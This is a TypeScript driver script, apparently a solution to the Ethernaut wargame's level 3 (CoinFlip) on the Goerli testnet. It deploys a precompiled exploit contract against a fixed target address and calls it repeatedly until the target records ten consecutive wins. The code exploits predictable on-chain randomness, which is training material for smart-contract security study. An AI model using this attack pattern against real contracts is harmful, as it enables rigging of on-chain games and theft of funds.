import CoinFlipJson from '../../../artifacts/contracts/level3/CoinFlip.sol/CoinFlip.json'
import CoinFlipExploitJson from '../../../artifacts/contracts/level3/CoinFlipExploit.sol/CoinFlipExploit.json'
const ethers = require('ethers');
require ('dotenv').config ()


const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
const privateKey: string = process.env.ACTOR_PRIVATE_KEY as string;
const coinFlipContractAddress: string = '0xA01F9Bf166a334DeA41558BEeb8Dc115D376E897';

let totalAttempts = 0;
let globalCoinFlipExploitContractAddress;
let coinFlipExploitContract;

// Define all function calls used
async function main(){
  console.log(`Ethernaut level 3 - script made by JoVi\n ------ `);
  const wallet = await new ethers.Wallet( privateKey, provider);
  const signer = wallet.connect(provider);
  const coinFlipContract = new ethers.Contract(coinFlipContractAddress, CoinFlipJson.abi, signer);
  const coinFlipExploitContractInterface = new ethers.ContractFactory(CoinFlipExploitJson.abi, CoinFlipExploitJson.bytecode, signer);

  const consecutiveWins = await coinFlipContract.consecutiveWins();

  console.log(`Checking consecutive wins amount\n ------ `);
  console.log(`...`);
  
  console.log(`${consecutiveWins}!\n ------ `);
  console.log(`${totalAttempts} attempts so far!\n ------ `);


  if(consecutiveWins > 9 ){
    console.log(`Task already solved! Move on, mate!\n ------ `);
    process.exit();
  } else {

  if (totalAttempts == 0){
    // deploy new exploit contract
    console.log(`Deploying coin flip exploit contract.\n ------ `)
    coinFlipExploitContract = await coinFlipExploitContractInterface.deploy( coinFlipContractAddress);
    
    console.log(`Coin flip exploit contract succesfully deployed at address ${coinFlipExploitContract.address}\n ------ \n`);
    globalCoinFlipExploitContractAddress = coinFlipExploitContract.address;
  
  } else {
    // use already deployed contract
    coinFlipExploitContract =new ethers.Contract(globalCoinFlipExploitContractAddress, CoinFlipExploitJson.abi, signer);
 
  }
  
  console.log(`Attempting to push coin flip transaction.\n ------ `);

  try{
      const coinFlipAttemptTx = await coinFlipExploitContract.attemptCoinFlip();
      const coinFlipAttemptTxReceipt = await coinFlipAttemptTx.wait();
      console.log(`Coinflip attempt succesfull\n ------ `);
  } catch(e){
      console.log(`Wrong answer\n ------ `);
      console.log(`${e}\n ------ `);
      
  }

  main();

  }
  totalAttempts += 1;
  
}


// Execute
main();